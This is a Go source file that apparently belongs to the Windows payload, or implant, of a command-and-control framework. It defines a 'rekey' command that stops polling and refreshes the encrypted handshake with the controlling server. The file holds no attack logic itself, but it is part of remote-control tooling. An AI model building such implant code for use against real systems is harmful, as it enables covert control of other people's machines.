// server/docker/payloads/Windows/action_rekey.go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"log"
	"time"
)

type RekeyCommand struct{}

func (c *RekeyCommand) Name() string {
	return "rekey"
}

func (c *RekeyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	log.Println("Executing rekey command from command queue...")

	// Note: The actual rekey logic is now handled in polling.go
	// when it receives the "rekey_required" status.
	// This function is kept for compatibility but shouldn't be
	// called directly anymore since rekey needs special handling
	// before decryption can occur.

	// If this is somehow called directly (shouldn't happen with new logic),
	// we still perform the rekey
	log.Println("Warning: Rekey command executed through normal command processing")
	log.Println("This should not happen - rekey should be handled via special status")

	// Stop existing polling first
	StopPolling()

	// Perform handshake refresh
	err := refreshHandshake()
	if err != nil {
		return CommandResult{
			Error:       err,
			ErrorString: fmt.Sprintf("rekey failed: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      "Successfully rekeyed connection (via command queue)",
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
